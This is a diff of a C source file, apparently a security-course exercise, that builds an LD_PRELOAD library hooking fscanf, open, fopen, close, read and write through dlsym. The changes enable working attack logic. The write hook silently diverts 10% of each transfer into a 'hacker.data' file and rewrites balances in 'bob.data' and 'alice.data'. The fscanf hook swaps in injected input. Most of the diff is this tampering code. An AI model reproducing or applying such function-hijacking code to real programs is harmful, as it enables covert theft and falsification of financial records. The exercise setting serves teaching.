@@ -80,7 +80,7 @@ static void allocate()
 
 
 int fscanf(FILE *stream, const char *format, ...){
-	printf("in  fscanf\n");	
+//	printf("in  fscanf\n");	
 	static int (*origFscanf)(FILE *,const char *, ...) = NULL;
 	if(!origFscanf)
 	{
@@ -94,19 +94,7 @@ int fscanf(FILE *stream, const char *format, ...){
 		char **b = va_arg(ap, char**);
 		char **buff = b;
 		*buff =(char *)malloc(sizeof(char)*20); 
-	//	strcpy(*buff, "turtle"); 
 		strcpy(*buff, reg);
-	/*
-		char *usrname = getlogin();
-		if(!usrname){
-		//	perror("__getlogin1() error");
-			printf("Error logging in \n");
-			exit(0);
-		}
-		//printf("buff before strcat is %s \n", *buff);
-		strcat(*buff, usrname);
-		//printf("buff is %s \n", *buff);
-	*/	
 		count = 1;
 	}
 	else { //Call scanf properly
@@ -118,61 +106,40 @@ int fscanf(FILE *stream, const char *format, ...){
 
 
 //Task 2
-/*
+
 int open(const char *pathname, int flags, ...){
 	va_list ap;
 	va_start(ap, flags);
-//	printf("in open \n");
 	int mode;
-		
+			
 	static int (*origOpen)(const char *, int, ...) = NULL;
-	if(!origOpen)
-	{
+//	if(!origOpen)
+//	{
 		origOpen = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");
-	}
+//	}
 	
 	int fd;
-	if((mode =va_arg(ap,int)) < 0){
-		origOpen(pathname, flags);
+	if((mode =va_arg(ap,int)) <=  0){
+		fd =origOpen(pathname, flags);
 	}
 	else{
-		origOpen(pathname, flags, mode);
+		fd =origOpen(pathname, flags, mode);
 	}
-	printf("va_arg returned :%d \n", mode);
+	//printf("va_arg returned :%d \n", mode);
 
 	//Set the task number which is opened for each task
 	int t = atoi(pathname);
-	printf("In open, pathname: %s, task:%d \n", pathname, t);
 	if(t == 4){
 		setTask(t);
 	}
 
-	//char readBuff[20];
-	//read(fd, readBuff, 20);
-	//printf("Read printed %s \n", readBuff);
-//	printf("in open filename %s \n", pathname);
-*/	//For task 2
-/*	if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
-		openBob(fd, pathname);	
-		printf("open bob \n");
-
-	}
-	if(strcmp(pathname, "alice.data") == 0){
-		openAlice(fd, pathname);
-		printf("open alice \n");
-	}
 	return fd;
 }
-*/
-/*int open(const char *pathname, int flags, mode_t mode){
-	printf("in second open filename %s  \n", pathname);
-	return 0;
-}*/
 
 
 FILE *fopen(const char *pathname, const char *mode){
 
-	printf("in fopen pathname: %s \n", pathname);
+//	printf("in fopen pathname: %s \n", pathname);
 	static FILE *(*origFopen)(const char *, const char *) = NULL;
 	FILE *retval;
 	if(!origFopen)
@@ -184,15 +151,20 @@ FILE *fopen(const char *pathname, const char *mode){
 
 	//Task 2
 	int fd = fileno(retval);
-	printf("fd is :%d \n",fd);
 	if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
 		openBob(fd, pathname);	
-		printf("open bob \n");
+	//	printf("open bob \n");
 
 	}
 	if(strcmp(pathname, "alice.data") == 0){
 		openAlice(fd, pathname);
-		printf("open alice \n");
+	//	printf("open alice \n");
+	}
+
+	//Task 4
+	int t = atoi(pathname);
+	if(t == 4){
+		setTask(t);
 	}
 
 	return retval;
@@ -204,9 +176,9 @@ FILE *fopen(const char *pathname, const char *mode){
 int close(int fd){
 	int retval;
 	static int (*origClose)(int) = NULL;
-	if(!origClose){
+	//if(!origClose){
 		origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
-	}
+	//}
 	retval = origClose(fd);
 	
 	closeBob(fd);
@@ -220,77 +192,79 @@ int close(int fd){
 ssize_t write(int handle, const void *buffer, size_t nbyte){
 	static int (*origWrite)(int,const void*, size_t) = NULL;
 	int retval;
-	if(!origWrite)
-	{
+	//if(!origWrite)
+	//{
 		origWrite = (int (*)(int,const void*, size_t))dlsym(RTLD_NEXT, "write");
-	}
+	//}
 
 	//If writing to bob and alice - must change their buffers before writing 
 	
-	char *buff;
 
 	//Task 4
-	/*
-	printf("In write, task is %d: \n", getTask());
-	int task = getTask();
-	if(task == 4){
-		printf("in task 4 \n");
+	int t = getTask();
+	if(t == 4){
 		if(handle == 3) { //The file getting the transfer	
 			int updated_value = atoi(buffer);
+	//		printf("updated val in handle == 3 is %d \n",updated_value);
 			int prev_val = getDesc3();
-			int diff = prev_val - updated_value;
+			int transfer_amount= prev_val - updated_value;
 			
-			setTransfer(prev_val - updated_value);
-			printf("Transfer val = %d \n", diff);
+			setTransfer(transfer_amount);
+			retval = origWrite(handle, buffer, nbyte);
+			return retval;
 		}
 		else if(handle ==4){
-			printf("In handle is 4: \n");
 			int prev_val = getDesc4();
-			printf("prev val is %d \n", prev_val);
 			int transfer_amount = getTransfer();
-			int transfer_to_hacker = transfer_amount*0.30;
+			//Calculate how much to send to hacker
+			int transfer_to_hacker =(transfer_amount*0.10);
+			//Calculate how much to send to receiver
 			transfer_amount -= transfer_to_hacker;
-			printf("transfer to hacker amount: %d \n", transfer_to_hacker);
-			printf("transfer amount %d \n", transfer_amount);
 
 			//Transfer to hacker
 			int hacker_fd;
 		
-			char *hacker_val = (char *)malloc(sizeof(char)*20);
+			char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
+			memset(hacker_val, '\0', 20);
 			hacker_fd = open("hacker.data", O_RDWR);
+			lseek(hacker_fd, 0, SEEK_SET);
 			read(hacker_fd, hacker_val, 20);
-			int amount_to_write = strlen(hacker_val);
 			int hack_val = atoi(hacker_val);
+//			printf("hacker val -> int is %d\n",hack_val);
 			hack_val += transfer_to_hacker; //Add to hacker ;
+			memset(hacker_val, '\0', 20);
 			sprintf(hacker_val, "%d", hack_val);
-			//strcpy(hacker_val, (char *)hack_val);
-			printf("hacker val: %s and hack_val: %d \n", hacker_val, hack_val);
-			printf("transfer amoutn is: %d \n", transfer_to_hacker);
+			int amount_to_write = strlen(hacker_val);
 			ftruncate(hacker_fd, 0);
 			lseek(hacker_fd, 0, SEEK_SET);
+	//		printf("amount to write is %d \n",amount_to_write);			
+	//		printf("hacker val read in is: %s\n", hacker_val);
 			origWrite(hacker_fd, hacker_val, amount_to_write);
-			free(hacker_val);
 			close(hacker_fd);
 
-			//Update value to write to desc 4
+			//Update value of receiver
 			int write_amount = prev_val + transfer_amount;
-			char *write_amount_to_4;
-			strcpy(write_amount_to_4, ""+write_amount);
-			strcpy(buff, write_amount_to_4);
+	//		printf("receiver value is :%d \n", write_amount);
+			char write_amount_to_4[20];
+			memset(write_amount_to_4, '\0', 20);
+			sprintf(write_amount_to_4, "%d", write_amount);
+			int nbytes = strlen(write_amount_to_4);
+	//		printf("nbytes for reciver: %d\n", nbytes);
+			retval = origWrite(handle, write_amount_to_4, nbytes);
+			return retval;
 		}
 
 	}
-	if((task != 4) || (handle != 4)){ //Take care of buffer being constant
-		strcpy(buff, buffer);
-	}
-*/
+
+
 	//Task 2
 	int bob_fd = getBobFd(); 
 	int alice_fd = getAliceFd(); 
 	if((bob_fd != -1) && (alice_fd != -1)){ //Bob and Alice are  open
 		int bob_balance = getBobBalance();
 		int alice_balance = getAliceBalance();
-		if(bob_balance < 100){
+		int amount_left_in_bob;
+		if(bob_balance <= 0){
 			if(handle == bob_fd){
 				char buf[20];
 				sprintf(buf, "%d", bob_balance);
@@ -313,31 +287,42 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 				if(bob_balance == -1){
 					printf("Error: cannot get bobs balance");
 					exit(1);
+				}						
+	//			printf("in read if - buf is %s \n", buf);
+				int nbyte;
+				if(bob_balance < 100){
+					sprintf(buf, "%d",0);
+					nbyte = strlen(buf);
 				}
-				printf("in read if - buf is %s \n", buf);
-				int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
-				if(diff == 100){
-					printf("in diff == 100 \n");
+				
+				//int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
+				//if(diff == 100){
+				else{
+	//				printf("in diff == 100 \n");
 					sprintf(buf, "%d", bob_balance-100);
-					printf("new buff is %s \n", buf);
-					int nbyte = strlen(buf);
-					retval = origWrite(handle, buf, nbyte); 
-					return retval; //Break out of function
+	//				printf("new buff is %s \n", buf);
+					nbyte = strlen(buf);
 				}
+				retval = origWrite(handle, buf, nbyte); 
+				return retval; //Break out of function
+				//}
 				
 			}else if(alice_fd == handle){ //Alice is Open
 				char buf[20];
-				printf("in alice if \n");
+	//			printf("in alice if \n");
 				int curr_bal = atoi(buffer);
 				int diff =  alice_balance - curr_bal;
-				if(diff == 100){
-					int orig = alice_balance; 
+				int orig = alice_balance;
+				int nbyte;
+				if(bob_balance < 100){
+					sprintf(buf, "%d", orig+bob_balance);
+					nbyte = strlen(buf);
+				}else{	
 					sprintf(buf, "%d", orig+100);
-					int nbyte = strlen(buf);
-					retval = origWrite(handle, buf, nbyte);
-					return retval; //Break out of function
+					nbyte = strlen(buf);
 				}
-		
+				retval = origWrite(handle, buf, nbyte);
+				return retval; //Break out of function
 			}
 		}
 	}
@@ -349,14 +334,16 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 ssize_t read(int handle, void *buf, size_t nbyte){
 	static int (*origRead)(int,void*, size_t) = NULL;
 	int retval;
-	if(!origRead)
-	{
+//	if(!origRead)
+//	{
 		origRead = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "read");
-	}
+//	}
+
+	memset(buf, '\0', nbyte);
 
 	retval = origRead(handle, buf, nbyte);
 
-	printf("read in %s \n", buf);
+	//printf("read in %s \n", buf);
 
 
 	//Task 2
@@ -364,6 +351,7 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 	int aliceFd = getAliceFd();
 	if((bobFd != -1) && (aliceFd != -1)){ // Alice and Bob are open
 		int bal = atoi(buf);
+		//int bal = atoi(temp_buff);
 		if(handle == aliceFd){
 			setAliceBalance(bal);
 		}
@@ -372,18 +360,19 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 		}
 	}
 			
-
-	int task = getTask();
-	if(task == 4){
+	//Task 4
+	int t = getTask();
+	if(t == 4){
+		
 		int prev_val = atoi(buf);
-		if(handle == 3){
+		if(handle == 3){ //Set prev value for the sender (fd == 3)
 			setDesc3(prev_val);
 		}
-		else if(handle == 4){
+		else if(handle == 4){ //Set prev value for the receiver (fd == 4)
 			setDesc4(prev_val);
 		}
 	}
-
+	
 	return retval;
 	
 }
